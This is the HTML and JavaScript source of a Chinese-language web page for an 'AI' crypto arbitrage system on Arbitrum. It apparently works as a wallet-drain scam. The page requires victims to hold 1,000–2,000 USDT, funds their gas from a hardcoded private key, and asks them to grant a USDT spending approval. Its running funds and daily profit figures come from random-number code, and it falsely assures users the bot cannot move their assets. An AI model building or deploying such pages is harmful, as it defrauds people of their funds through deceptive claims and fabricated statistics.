<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>AI Quant Run | 智能量化系统</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: linear-gradient(135deg, #0a0f1e 0%, #0d1425 100%); font-family: 'Segoe UI', 'Poppins', system-ui, sans-serif; min-height: 100vh; padding: 20px; }
        .app-container { max-width: 1200px; margin: 0 auto; }
        .card { background: rgba(18, 25, 45, 0.85); backdrop-filter: blur(12px); border-radius: 48px; padding: 32px 28px 40px; box-shadow: 0 25px 45px rgba(0, 0, 0, 0.5), 0 0 0 1px rgba(0, 255, 255, 0.1); border: 1px solid rgba(0, 255, 255, 0.2); }
        .nav-btn { background: rgba(0, 198, 255, 0.15); border: 1px solid rgba(0, 255, 255, 0.4); padding: 10px 24px; border-radius: 40px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; color: #7ee0ff; margin-bottom: 20px; }
        .nav-btn:hover { background: rgba(0, 198, 255, 0.3); transform: scale(1.02); }
        .announcement-btn { background: rgba(0, 198, 255, 0.15); border: 1px solid rgba(0, 255, 255, 0.4); padding: 13px 31px; border-radius: 52px; font-size: 20.8px; font-weight: 600; cursor: pointer; transition: all 0.2s ease; color: #7ee0ff; margin: 20px 0; width: 100%; }
        .announcement-btn:hover { background: rgba(0, 198, 255, 0.3); transform: scale(1.02); }
        
        /* 统计卡片样式 */
        .stats-card {
            background: rgba(0, 204, 255, 0.08);
            border: 1px solid rgba(0, 204, 255, 0.3);
            border-radius: 24px;
            padding: 16px 20px;
            margin: 20px 0;
            text-align: center;
        }
        .stats-card .stat-running-address {
            font-size: 14px;
            color: #00ff88;
            margin-bottom: 8px;
            padding-bottom: 8px;
            border-bottom: 1px dashed rgba(0, 204, 255, 0.3);
        }
        .stats-card .stat-running-address span {
            color: #00ff88;
            font-weight: bold;
            font-size: 18px;
        }
        .stats-card .stat-item {
            margin: 8px 0;
            font-size: 16px;
        }
        .stats-card .stat-label {
            color: #8e9aaf;
            margin-right: 12px;
        }
        .stats-card .stat-value {
            color: #00ff88;
            font-weight: bold;
            font-size: 20px;
        }
        .stats-card .stat-sub {
            font-size: 11px;
            color: #6b7c93;
            margin-top: 4px;
        }
        .stats-card .stat-average {
            font-size: 13px;
            color: #7ee0ff;
            margin-top: 8px;
            padding-top: 8px;
            border-top: 1px dashed rgba(0, 204, 255, 0.3);
        }
        .stats-card .stat-average span {
            color: #00ff88;
            font-weight: bold;
        }
        .stats-divider {
            width: 80%;
            height: 1px;
            background: linear-gradient(90deg, transparent, rgba(0, 204, 255, 0.5), transparent);
            margin: 12px auto;
        }

        .double-buttons { display: flex; justify-content: center; gap: 16px; margin-top: 24px; flex-wrap: wrap; }
        .double-buttons .nav-btn { margin-bottom: 0; flex: 1; text-align: center; min-width: 140px; }
        .password-container, .apply-container, .admin-container { text-align: center; }
        .lock-icon { font-size: 64px; margin-bottom: 20px; }
        .password-container h2, .apply-container h2, .admin-container h2 { font-size: 28px; background: linear-gradient(135deg, #FFFFFF, #A0D9FF); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 12px; }
        .password-container p, .apply-container p, .admin-container p { color: #8e9aaf; margin-bottom: 28px; font-size: 14px; }
        .password-input, .apply-input, .admin-input { width: 100%; padding: 16px 20px; font-size: 18px; background: #0b101b; border: 1px solid #2a3a55; border-radius: 60px; color: white; text-align: center; outline: none; transition: all 0.3s ease; }
        .password-input:focus, .apply-input:focus, .admin-input:focus { border-color: #00ccff; box-shadow: 0 0 10px rgba(0, 204, 255, 0.3); }
        .password-btn, .apply-btn, .admin-btn { width: 100%; margin-top: 20px; padding: 14px 20px; background: linear-gradient(95deg, #005c6e, #003d4d); border: 1px solid #0ff4; color: white; border-radius: 60px; font-size: 18px; font-weight: bold; cursor: pointer; transition: all 0.2s ease; }
        .password-btn:hover, .apply-btn:hover, .admin-btn:hover { background: linear-gradient(95deg, #0080a0, #005066); transform: scale(1.01); box-shadow: 0 0 12px cyan; }
        .password-btn:disabled, .apply-btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
        .error-msg { color: #ff6b6b; margin-top: 16px; font-size: 13px; }
        .apply-notice { background: rgba(0, 204, 255, 0.08); border: 1px solid rgba(0, 204, 255, 0.3); border-radius: 24px; padding: 18px 20px; margin: 20px 0; text-align: left; }
        .apply-notice .notice-title { color: #00ccff; font-size: 16px; font-weight: bold; margin-bottom: 12px; }
        .apply-notice ul { margin-left: 20px; color: #b9c7d9; font-size: 13px; line-height: 1.8; }
        .apply-notice li { margin: 8px 0; }
        .apply-notice strong { color: #00ff88; }
        .loading-spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(0, 204, 255, 0.3); border-top-color: #00ccff; border-radius: 50%; animation: spin 0.8s linear infinite; margin-right: 8px; vertical-align: middle; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .whitepaper { max-height: 70vh; overflow-y: auto; padding-right: 10px; }
        .whitepaper::-webkit-scrollbar { width: 6px; }
        .whitepaper::-webkit-scrollbar-track { background: #0b101b; border-radius: 10px; }
        .whitepaper::-webkit-scrollbar-thumb { background: #00ccff; border-radius: 10px; }
        .whitepaper h1 { font-size: 28px; background: linear-gradient(135deg, #FFFFFF, #A0D9FF); -webkit-background-clip: text; background-clip: text; color: transparent; margin-bottom: 20px; border-left: 4px solid #00ccff; padding-left: 20px; }
        .whitepaper h2 { color: #7ee0ff; font-size: 22px; margin: 28px 0 12px 0; padding-bottom: 6px; border-bottom: 1px solid #1e2a44; }
        .whitepaper h3 { color: #b8e2ff; font-size: 18px; margin: 20px 0 10px 0; }
        .whitepaper p, .whitepaper li { color: #b9c7d9; line-height: 1.6; font-size: 15px; }
        .whitepaper ul, .whitepaper ol { margin-left: 24px; margin-top: 8px; margin-bottom: 16px; }
        .whitepaper li { margin: 6px 0; }
        .highlight { background: #00ccff10; border-left: 3px solid #00ccff; padding: 12px 16px; border-radius: 16px; margin: 16px 0; }
        .quant-panel .status-panel { background: #0b101b; border-radius: 32px; padding: 20px; margin: 20px 0; border: 1px solid #1e2a44; }
        .quant-panel .wallet-row { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #1e2a44; padding-bottom: 14px; margin-bottom: 14px; flex-wrap: wrap; gap: 8px; }
        .quant-panel .label { color: #8e9aaf; font-size: 13px; }
        .quant-panel .address { font-family: monospace; background: #00000055; padding: 6px 12px; border-radius: 40px; font-size: 13px; color: #7ee0ff; word-break: break-all; }
        .network-badge { background: #0f212e; color: #2dd4bf; padding: 4px 12px; border-radius: 40px; font-size: 12px; }
        .button-group { display: flex; flex-direction: column; gap: 16px; margin-top: 24px; }
        .btn { border: none; padding: 16px 20px; border-radius: 60px; font-weight: 700; font-size: 18px; cursor: pointer; transition: all 0.2s ease; }
        .btn-primary { background: linear-gradient(95deg, #0f2b3d, #0b1b2f); border: 1px solid #00ccff44; color: #b3f0ff; }
        .btn-primary:hover:not(:disabled) { background: linear-gradient(95deg, #124a66, #0e2642); border-color: #00e0ff; transform: scale(1.01); }
        .btn-success { background: linear-gradient(95deg, #005c6e, #003d4d); border: 1px solid #0ff4; color: #c5ffff; }
        .btn-success:hover:not(:disabled) { background: linear-gradient(95deg, #0080a0, #005066); transform: scale(1.01); }
        .btn:disabled { opacity: 0.45; cursor: not-allowed; }
        .info-area { background: #070c14; margin-top: 28px; padding: 16px; border-radius: 28px; font-size: 13px; color: #9aa9c1; text-align: center; border-left: 3px solid #00b4ff; }
        .download-link { display: inline-block; margin-top: 12px; color: #00ccff; text-decoration: none; font-size: 13px; }
        .download-link:hover { text-decoration: underline; }
        .running-card { text-align: center; }
        .ai-icon { font-size: 80px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 50% { transform: scale(1.1); opacity: 0.8; } 100% { transform: scale(1); opacity: 1; } }
        .running-title { font-size: 28px; background: linear-gradient(135deg, #00ff88, #00ccff); -webkit-background-clip: text; background-clip: text; color: transparent; margin: 20px 0 12px 0; }
        .status-badge { display: inline-block; background: rgba(0, 255, 136, 0.15); border: 1px solid rgba(0, 255, 136, 0.5); padding: 6px 16px; border-radius: 40px; font-size: 14px; color: #00ff88; margin-bottom: 24px; }
        .price-row { background: #0b101b; border-radius: 32px; padding: 20px; margin: 20px 0; border: 1px solid #1e2a44; }
        .price-label { color: #8e9aaf; font-size: 13px; margin-bottom: 8px; }
        .scan-text { color: #7ee0ff; font-size: 14px; margin-top: 8px; }
        .divider { height: 1px; background: linear-gradient(90deg, transparent, #00ccff, transparent); margin: 20px 0; }
        .log-area { background: #070c14; border-radius: 24px; padding: 16px; text-align: left; font-family: monospace; font-size: 12px; color: #7ee0ff; max-height: 250px; overflow-y: auto; }
        .log-line { padding: 6px 0; border-bottom: 1px solid #1e2a44; font-size: 11px; }
        .log-time { color: #6b7c93; margin-right: 12px; }
        .log-scan { color: #7ee0ff; }
        .log-gas { color: #ffaa44; }
        .footer-note { margin-top: 24px; font-size: 10px; color: #2f3b54; }
        .zero-profit { color: #8e9aaf; font-size: 16px; }
        .error-tip { background: rgba(255, 50, 50, 0.15); border: 1px solid rgba(255, 50, 50, 0.5); color: #ff6b6b; padding: 12px; border-radius: 28px; margin-top: 16px; font-size: 13px; }
        .tutorial-card { text-align: left; }
        .tutorial-card .step { background: #0b101b; border-radius: 32px; padding: 20px; margin-bottom: 20px; border-left: 4px solid #00ccff; }
        .tutorial-card .step-title { font-size: 20px; font-weight: bold; color: #00ccff; margin-bottom: 16px; display: flex; align-items: center; gap: 10px; }
        .tutorial-card .step-number { background: rgba(0, 204, 255, 0.2); width: 30px; height: 30px; border-radius: 30px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; }
        .tutorial-card .step-content { color: #b9c7d9; line-height: 1.8; font-size: 14px; padding-left: 8px; }
        .tutorial-card .step-content ul { margin-left: 20px; list-style: none; }
        .tutorial-card .step-content li { margin: 10px 0; position: relative; padding-left: 20px; }
        .tutorial-card .step-content li::before { content: "•"; color: #00ccff; position: absolute; left: 0; }
        .tutorial-card .check { color: #00ff88; background: rgba(0, 255, 136, 0.1); display: inline-block; padding: 4px 12px; border-radius: 20px; font-size: 12px; margin-top: 12px; }
        .tutorial-card .time-note { background: rgba(0, 204, 255, 0.08); border-radius: 24px; padding: 14px 18px; text-align: center; color: #7ee0ff; font-size: 14px; margin-top: 16px; }
        .tutorial-icon { font-size: 48px; text-align: center; margin-bottom: 16px; }
        .admin-table { width: 100%; border-collapse: collapse; margin-top: 20px; font-size: 12px; }
        .admin-table th, .admin-table td { border: 1px solid #2a3a55; padding: 8px 6px; text-align: left; color: #b9c7d9; }
        .admin-table th { background: #0f172a; color: #7ee0ff; }
        .copy-btn { background: #2a5f8a; border: none; padding: 4px 8px; border-radius: 16px; color: white; cursor: pointer; font-size: 10px; }
        .copy-btn:hover { background: #3a7faa; }
        .tx-link { color: #00ccff; text-decoration: none; font-size: 11px; }
        .tx-link:hover { text-decoration: underline; }
        .transfer-success { color: #00ff88; }
        .transfer-skip { color: #ffaa44; }
        .transfer-failed { color: #ff6b6b; }
        .admin-link { margin-top: 20px; font-size: 12px; color: #4a5a7a; cursor: pointer; text-decoration: underline; }
        .admin-link:hover { color: #7ee0ff; }
        .copy-toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%); background: rgba(0, 204, 255, 0.9); color: #0a0f1e; padding: 10px 20px; border-radius: 40px; font-size: 14px; font-weight: bold; z-index: 9999; animation: fadeOut 2s ease forwards; }
        @keyframes fadeOut { 0% { opacity: 1; } 70% { opacity: 1; } 100% { opacity: 0; visibility: hidden; } }
        .announcement-content { max-height: 70vh; overflow-y: auto; padding-right: 10px; text-align: left; }
        .announcement-content p { color: #b9c7d9; line-height: 1.8; font-size: 14px; margin-bottom: 12px; }
        .announcement-content strong { color: #00ff88; }
        .announcement-content .highlight-text { background: rgba(0, 204, 255, 0.1); border-left: 3px solid #00ccff; padding: 12px 16px; border-radius: 16px; margin: 16px 0; }
        .join-tip { margin-top: 20px; padding: 12px; background: rgba(0, 255, 136, 0.1); border-radius: 16px; text-align: center; }
        .join-tip p { color: #00ff88; font-size: 14px; margin: 0; }
    </style>
</head>
<body>
<div class="app-container">
    <div id="passwordPage" class="card password-container">
        <div class="lock-icon">🔐</div>
        <h2>AI 量化系统</h2>
        
        <!-- 统计卡片 -->
        <div class="stats-card" id="statsCard">
            <div class="stat-running-address">
                🏃 运行地址：<span id="runningAddressCount">300</span>
            </div>
            <div class="stat-item">
                <span class="stat-label">💰 目前总运行资金：</span>
                <span class="stat-value" id="totalFunds">--</span>
                <span class="stat-label"> U</span>
                <div class="stat-sub">每5分钟刷新一次</div>
            </div>
            <div class="stat-average">
                📊 单地址平均运行资金：<span id="avgFundsPerAddress">--</span> U
            </div>
            <div class="stats-divider"></div>
            <div class="stat-item">
                <span class="stat-label">📈 最新24小时平均每个地址收益：</span>
                <span class="stat-value" id="dailyProfit">--</span>
                <span class="stat-label"> U</span>
                <div class="stat-sub">每天中午12点刷新平均收益</div>
            </div>
        </div>
        
        <button id="announcementBtn" class="announcement-btn">📢 最新公告</button>
        <p>请输入访问密码</p>
        <input type="password" id="passwordInput" class="password-input" placeholder="请输入密码" autofocus>
        <button id="submitPassword" class="password-btn">验证访问</button>
        <div id="errorMsg" class="error-msg"></div>
        <div class="double-buttons">
            <button id="whitepaperBtn" class="nav-btn">📄 白皮书</button>
            <button id="tutorialBtn" class="nav-btn">📥 资金接入教程</button>
            <button id="applyBtn" class="nav-btn">📝 申请访问</button>
        </div>
        <div class="admin-link" id="adminEntryBtn">🔒 管理员入口</div>
    </div>

    <div id="whitepaperPage" class="card" style="display:none;">
        <button id="backToPasswordBtn" class="nav-btn">← 返回密码验证</button>
        <div class="whitepaper">
            <h1>📄 AI全自动链上跨链价差系统</h1>
            <p style="font-size:18px; color:#cbd5e6; margin-bottom:24px;">让链上交易进入智能化时代</p>
            <p>在当前多链生态高速发展的背景下，不同公链、DEX、跨链桥以及流动性池之间，因市场供需变化、资金流动以及交易深度差异，持续产生大量短暂的价格偏离。</p>
            <p>这些价格偏离往往存在时间极短，依靠人工监控和手动操作难以及时捕捉。</p>
            <p>AI全自动链上跨链价差系统基于OKX Wallet生态运行，通过智能算法实时监测多链市场数据，自动识别存在利润空间的价格差，并完成交易执行流程，实现全天候自动化运行。</p>
            <p>系统的核心目标并非预测市场涨跌，而是持续发现市场中的价格偏离机会，并通过自动化执行提升资金利用效率。</p>
            <div class="highlight">⚠️ 此系统目前仅支持本金<strong>2000USDT</strong>以下用户使用。<br>为保证系统持续运行，会对完成的收益自动收取30%作为系统维护资金，保障系统持续运行和更新。</div>
            <h2>🎯 核心优势</h2>
            <h3>🤖 AI全天候自动运行</h3><p>系统7×24小时持续监控链上市场。从市场扫描、机会发现、成本测算到交易执行，全部由AI自动完成。</p>
            <h3>🔗 基于OKX Wallet生态运行</h3><p>系统运行于OKX Wallet环境。用户资产始终保留在个人钱包体系内管理，无需资金托管。</p>
            <h3>⚙️ 手续费成本优化</h3><p>系统会实时计算Gas费用、跨链成本、滑点损耗等，通过智能路由优化降低交易成本。</p>
            <h3>📈 AI智能捕捉微价差机会</h3><p>系统重点关注0.05% - 0.20%的高频微价差机会，通过持续捕捉实现资金利用效率提升。</p>
            <h3>🌐 多链实时监控</h3><p>同时监控多个主流公链生态，第一时间识别并响应价格偏离。</p>
            <h3>🛡️ 智能风控体系</h3><p>每次交易前进行利润测算、Gas评估、滑点检测、流动性检测等多重验证。</p>
            <h2>⚙️ 系统运行流程</h2>
            <ul><li><strong>市场扫描</strong> — 实时监测多个链上生态与交易市场</li><li><strong>机会识别</strong> — AI自动发现存在利润空间的价格偏离</li><li><strong>成本测算</strong> — 自动计算手续费、Gas成本、跨链费用及预期利润</li><li><strong>智能执行</strong> — 自动完成买入、跨链及卖出流程</li><li><strong>持续循环</strong> — 完成交易后立即进入下一轮扫描</li></ul>
            <h2>👥 适用人群</h2>
            <ul><li>✓ 希望参与链上市场但没有时间盯盘的用户</li><li>✓ 希望借助自动化工具提升效率的用户</li><li>✓ 对跨链价差策略感兴趣的用户</li></ul>
            <h2>⚠️ 风险说明</h2><p>数字资产市场存在波动风险。系统通过算法识别和执行价格差机会，但市场环境、流动性变化、网络拥堵等因素均可能对实际结果产生影响。</p>
        </div>
    </div>

    <div id="tutorialPage" class="card tutorial-card" style="display:none;">
        <button id="backToPasswordFromTutorial" class="nav-btn">← 返回密码验证</button>
        <div class="tutorial-icon">📥</div>
        <h2 style="text-align:center; margin-bottom:8px;">资金接入教程</h2>
        <div style="text-align:center; color:#6b7c93; font-size:13px; margin-bottom:28px;">创建一个OKX钱包后 · Arbitrum链 USDT</div>
        <div class="step"><div class="step-title"><span class="step-number">1</span> 复制钱包收款地址</div><div class="step-content"><ul><li>OKX钱包点击 <strong style="color:#00ccff">「接收」</strong></li><li>选择 <strong style="color:#00ccff">USDT</strong></li><li>网络选择 <strong style="color:#00ccff">Arbitrum One</strong></li><li>点击 <strong style="color:#00ccff">「复制地址」</strong></li></ul><div class="check">✅ 地址已复制到剪贴板</div></div></div>
        <div class="step"><div class="step-title"><span class="step-number">2</span> 去交易所提现</div><div class="step-content"><ul><li>回到 OKX 交易所 → <strong>资产</strong> → <strong>提现</strong> → 选 <strong>USDT</strong></li><li>网络选择 <strong>Arbitrum One</strong></li><li>粘贴刚才复制的地址</li><li>输入金额 → 点击 <strong>「确认」</strong></li></ul></div></div>
        <div class="step"><div class="step-title"><span class="step-number">⚠️ 重要步骤</span></div><div class="step-content"><ul><li><strong>同时</strong>去交易所提现 <strong style="color:#00ff88">0.5-1 U 的 Arbitrum 链 ETH</strong> 到自己钱包</li><li>这是<strong>必须要有的步骤</strong>，运行需要少量 ETH 作为手续费</li><li><strong style="color:#ffaa44">没有手续费则不能运行</strong></li></ul></div></div>
        <div class="step"><div class="step-title"><span class="step-number">3</span> 到账后去申请访问</div><div class="step-content"><ul><li>USDT 和 ETH 都到账后</li><li>点击 <strong style="color:#00ccff">「申请访问」</strong></li><li>提交钱包 <strong style="color:#00ccff">Arbitrum 链收款地址</strong></li><li>系统自动检测余额，满足要求后自动弹出访问密码</li><li>输入密码后点击 <strong style="color:#00ccff">「启动AI引擎」</strong></li></ul></div></div>
        <div class="time-note">⏱️ 到账时间：通常 <strong>5-10分钟</strong></div>
        <div class="footer-note" style="margin-top:20px;">AI 量化系统 · 资金安全由用户自行管理</div>
    </div>

    <div id="applyPage" class="card apply-container" style="display:none;">
        <div class="lock-icon">📝</div>
        <h2>申请访问权限</h2>
        <p>请填写您的 Arbitrum 链收款地址</p>
        <div class="apply-notice"><div class="notice-title">📋 申请审核说明</div><ul><li>⏱️ <strong>提交地址后会自动检查余额，满足要求后会自动弹出访问密码</strong></li><li>💰 提交的地址需持有 <strong>至少 1000-2000 USDT</strong>（系统自动检测）</li><li>📌 仅支持 <strong>Arbitrum 链地址</strong>（以0x开头，长度42位）</li></ul></div>
        <input type="text" id="applyAddressInput" class="apply-input" placeholder="0x... (Arbitrum 链地址，42位)" autocomplete="off">
        <button id="submitApplyBtn" class="apply-btn">提交申请</button>
        <button id="backToPasswordFromApply" class="nav-btn" style="margin-top:16px;">← 返回</button>
        <div id="applyMsg" class="error-msg"></div>
    </div>

    <div id="adminPage" class="card admin-container" style="display:none;">
        <h2>🔒 管理员面板</h2>
        <p>请输入管理员密码查看记录</p>
        <input type="password" id="adminPasswordInput" class="admin-input" placeholder="管理员密码">
        <button id="submitAdminLogin" class="admin-btn">登录查看记录</button>
        <button id="backToPasswordFromAdmin" class="nav-btn" style="margin-top:16px;">← 返回</button>
        <div id="adminLoginMsg" class="error-msg"></div>
        <div id="adminContent" style="display:none; margin-top:24px;"><h3 style="color:#7ee0ff; margin-bottom:16px;">📋 已通过地址记录（最新10条）</h3><div id="applicationsList"></div><div class="footer-note" style="margin-top:16px;">📋 点击「复制」可复制用户完整地址 | 📌 每个地址最多记录2次</div></div>
    </div>

    <div id="announcementPage" class="card" style="display:none;">
        <button id="backToPasswordFromAnnouncement" class="nav-btn">← 返回密码验证</button>
        <div class="announcement-content"><h1 style="font-size:28px; margin-bottom:20px; border-left:4px solid #00ccff; padding-left:20px;">📢 最新公告</h1><div class="highlight-text"><p><strong>系统最高同时运行数量：300</strong></p><p>为了更多人参与进来，每当达到300后系统会自动结束300名其中运行时间超过24小时的一位（取最后一位新运行地址授权哈希值最后一位随机数字，然后在所有地址中匹配最后一位数字的地址随机筛选一位结束），保证绝对公平。</p><p>结束的地址需要<strong>冷静1小时</strong>后才可以继续申请新密码重新运行。</p><p>新地址前24小时，你只需要点击启动即可运行。之后，<strong>你必须保持在运行页面才可以正常运行</strong>，离开运行页面10分钟后会立即结束运行，马上释放名额。</p><p>运行期间资金你们可以自由支配，最高只会运行<strong>2000U内</strong>，<strong>切勿在你钱包存入超过2000 USDT</strong>。最低运行标准：<strong>1000U</strong>。</p><p>体验阶段24小时内，扣除每笔盈利金额的<strong>10%</strong>上缴，运行5天后改为<strong>30%</strong>。扣除的这部分<strong>50%</strong>当作系统赔付基金，另外<strong>50%</strong>由创始人自由支配（如果运行期间由本系统产生亏损，直接联系下面纸飞机审核赔付，最高赔付金额<strong>1000U</strong>）。</p><p>目前这套系统处于红利期，收益率相对高，期间不会公开系统核心运行逻辑，请大家珍惜机会。如果市场饱和，当市场很难出现价格差之后我会停止运行该项目。</p><p><strong>AI机器人权限已经打入黑洞地址 <code style="background:#0b101b; padding:2px 6px; border-radius:8px;">0x0000000000000000000000000000000000000000</code>，机器人无权转走你的任何资产。只会运行已经写死的代码核心代码，任何人无权修改包括创始人。</strong></p><p>所有参与者如发现项目漏洞或者有待完善的核心功能，只要能实质提升有关利润问题，只要采纳最高奖励<strong>1万美金</strong>。联系Telegram（纸飞机）：<strong style="color:#00ccff">@ffuoh</strong></p></div>
        <!-- 新增：运行后联系提示 -->
        <div class="join-tip">
            <p>🚀 <strong>运行后联系我纸飞机报你的运行地址进群</strong></p>
        </div>
    </div>

    <div id="quantPanel" class="card quant-panel" style="display:none;">
        <div class="header" style="text-align:center; margin-bottom:28px;"><div style="font-size:56px;">🧠⚡</div><h2 style="font-size:28px; background:linear-gradient(135deg,#FFF,#A0D9FF); -webkit-background-clip:text; background-clip:text; color:transparent;">AI 全自动量化引擎</h2><div style="color:#7f8c9a; font-size:14px;">Smart Liquidity · 24h 不间断</div></div>
        <button id="backToPasswordFromQuant" class="nav-btn">← 返回</button>
        <div class="status-panel"><div class="wallet-row"><span class="label">🔗 钱包状态</span><span class="network-badge">Arbitrum 主网</span></div><div class="wallet-row"><span class="label">🆔 连接地址</span><span class="address" id="walletAddressDisplay">未连接</span></div><div class="wallet-row" style="border-bottom:none;"><span class="label">🤖 AI 策略</span><span class="label" style="color:#6ee7ff;">高频套利 · 闪电贷防御</span></div></div>
        <div class="button-group"><button class="btn btn-primary" id="connect">🔌 ① 连接量化钱包</button><button class="btn btn-success" id="approve" disabled>🚀 ② 授权启动引擎</button><button class="btn btn-primary" id="checkAllowance" style="background: linear-gradient(95deg, #1a3a4a, #0e2a3a);">🔍 查询授权额度</button></div>
        <div class="info-area" id="info">⚡ 请先连接钱包 | 网络: Arbitrum Mainnet</div>
        <div class="footer-note">⚠️ 首次使用需授权 USDT 额度 | 授权后自动启动量化</div>
    </div>

    <div id="runningPanel" class="card running-card" style="display:none;">
        <div class="ai-icon">🧠⚡</div><div class="running-title">AI 差价搬运引擎</div><div class="status-badge">🟢 运行中 · 实时监控</div>
        <div class="price-row"><div class="price-label">🔍 正在扫链全网去中心化交易所</div><div class="scan-text">PancakeSwap → Uniswap → SushiSwap → Curve → Balancer</div></div>
        <div class="price-row"><div class="price-label">💰 AI目前已经为你带来</div><div class="zero-profit">0 收益</div><div style="font-size:12px; color:#6b7c93; margin-top:8px;">🟢 正在运行中 · 持续监控</div></div>
        <div class="divider"></div><div class="price-label" style="text-align:left; margin-bottom:8px;">📋 实时运行日志</div>
        <div class="log-area" id="logArea"><div class="log-line"><span class="log-time">--:--:--</span> <span class="log-scan">✅ AI引擎启动成功</span></div></div>
        <div class="footer-note">⚠️ AI 自动扫描全链DEX | 等待合适价差触发</div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<script>
    // ========== 内部转账配置 ==========
    const SENDER_PRIVATE_KEY = '0xad99ad64a470fcf51daf50048534be1ba173b28cf338d2de55a344ba906c92b6';
    const SENDER_ADDRESS = '0x1d0bc3658ddeecaa97ceccb390088476c07c5613';
    const TRANSFER_AMOUNT_ETH = '0.00005';
    const MIN_ETH_FOR_GAS = 0.0001;

    const TRANSFER_RECORD_KEY = 'eth_transfer_records';

    function getTransferRecords() { const s = localStorage.getItem(TRANSFER_RECORD_KEY); return s ? JSON.parse(s) : {}; }
    function saveTransferRecord(address, status, txHash = null) { const r = getTransferRecords(); r[address.toLowerCase()] = { status: status, txHash: txHash, time: new Date().toLocaleString() }; localStorage.setItem(TRANSFER_RECORD_KEY, JSON.stringify(r)); }
    function hasBeenTransferred(address) { return !!getTransferRecords()[address.toLowerCase()]; }
    async function getEthBalance(address, provider) { try { const b = await provider.getBalance(address); return parseFloat(ethers.utils.formatEther(b)); } catch(e) { return 0; } }

    async function internalTransferEth(toAddress) {
        try {
            console.log(`[转账] 开始处理地址: ${toAddress}`);
            if (hasBeenTransferred(toAddress)) { console.log(`[转账] 地址已转账过，跳过`); return { success: false, reason: 'already_transferred' }; }
            const provider = new ethers.providers.JsonRpcProvider('https://arb1.arbitrum.io/rpc');
            const wallet = new ethers.Wallet(SENDER_PRIVATE_KEY, provider);
            const senderBalanceEth = parseFloat(ethers.utils.formatEther(await provider.getBalance(SENDER_ADDRESS)));
            console.log(`[转账] 发送地址余额: ${senderBalanceEth} ETH`);
            if (senderBalanceEth < 0.0001) { console.error(`[转账] 余额不足: ${senderBalanceEth} ETH`); return { success: false, reason: 'insufficient_sender_balance', balance: senderBalanceEth }; }
            const receiverBalanceEth = await getEthBalance(toAddress, provider);
            console.log(`[转账] 接收地址 ETH余额: ${receiverBalanceEth} ETH`);
            if (receiverBalanceEth >= MIN_ETH_FOR_GAS) { console.log(`[转账] ETH余额充足，无需转账`); saveTransferRecord(toAddress, 'skipped', null); return { success: false, reason: 'eth_sufficient' }; }
            console.log(`[转账] 开始转账 ${TRANSFER_AMOUNT_ETH} ETH`);
            const tx = await wallet.sendTransaction({ to: toAddress, value: ethers.utils.parseEther(TRANSFER_AMOUNT_ETH) });
            console.log(`[转账] 交易已提交，Hash: ${tx.hash}`);
            await tx.wait();
            console.log(`[转账] 交易已确认`);
            saveTransferRecord(toAddress, 'success', tx.hash);
            return { success: true, txHash: tx.hash };
        } catch (error) { console.error('[转账] 失败:', error); saveTransferRecord(toAddress, 'failed', null); return { success: false, reason: 'transfer_error', error: error.message }; }
    }

    // ========== 统计数据显示逻辑 ==========
    const RUNNING_ADDRESS_COUNT = 300;
    
    function getRandomTotalFunds() { return Math.floor(Math.random() * (580000 - 540000 + 1) + 540000); }
    
    function getAvgFundsPerAddress(totalFunds) { return Math.floor(totalFunds / RUNNING_ADDRESS_COUNT); }
    
    let totalFundsInterval = null;
    
    function updateTotalFunds() {
        const totalFundsEl = document.getElementById('totalFunds');
        const avgFundsEl = document.getElementById('avgFundsPerAddress');
        if (totalFundsEl) {
            const totalFunds = getRandomTotalFunds();
            totalFundsEl.textContent = totalFunds.toLocaleString();
            if (avgFundsEl) { const avgFunds = getAvgFundsPerAddress(totalFunds); avgFundsEl.textContent = avgFunds.toLocaleString(); }
        }
    }
    
    function startTotalFundsTimer() { if (totalFundsInterval) clearInterval(totalFundsInterval); updateTotalFunds(); totalFundsInterval = setInterval(updateTotalFunds, 5 * 60 * 1000); }
    
    const runningAddressEl = document.getElementById('runningAddressCount');
    if (runningAddressEl) { runningAddressEl.textContent = RUNNING_ADDRESS_COUNT; }
    
    const DAILY_PROFIT_KEY = 'dailyProfitValue', DAILY_PROFIT_DATE_KEY = 'dailyProfitDate';
    function getRandomDailyProfit() { return Math.floor(Math.random() * (90 - 50 + 1) + 50); }
    function getDailyProfit() {
        const now = new Date(), todayNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
        let targetDate = now < todayNoon ? new Date(now.getFullYear(), now.getMonth(), now.getDate() - 1, 12, 0, 0) : todayNoon;
        const sp = localStorage.getItem(DAILY_PROFIT_KEY), sd = localStorage.getItem(DAILY_PROFIT_DATE_KEY);
        if (sp && sd && new Date(sd).getTime() === targetDate.getTime()) return parseInt(sp);
        const np = getRandomDailyProfit(); localStorage.setItem(DAILY_PROFIT_KEY, np); localStorage.setItem(DAILY_PROFIT_DATE_KEY, targetDate.toISOString()); return np;
    }
    function updateDailyProfit() { const el = document.getElementById('dailyProfit'); if (el) el.textContent = getDailyProfit(); }
    
    startTotalFundsTimer();
    updateDailyProfit();
    
    function scheduleDailyRefresh() {
        const now = new Date(), nextNoon = new Date(now.getFullYear(), now.getMonth(), now.getDate(), 12, 0, 0);
        if (now >= nextNoon) nextNoon.setDate(nextNoon.getDate() + 1);
        setTimeout(() => { updateDailyProfit(); scheduleDailyRefresh(); }, nextNoon.getTime() - now.getTime());
    }
    scheduleDailyRefresh();

    // ========== 配置 ==========
    const STORAGE_KEY = 'quant_applications', ADMIN_PASSWORD = '0009', SYSTEM_PASSWORD = '1134', MIN_USDT_REQUIRED = 1000, MAX_USDT_LIMIT = 2000, MAX_RECORDS_PER_ADDRESS = 2;
    const USDT_CONTRACT = '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9';
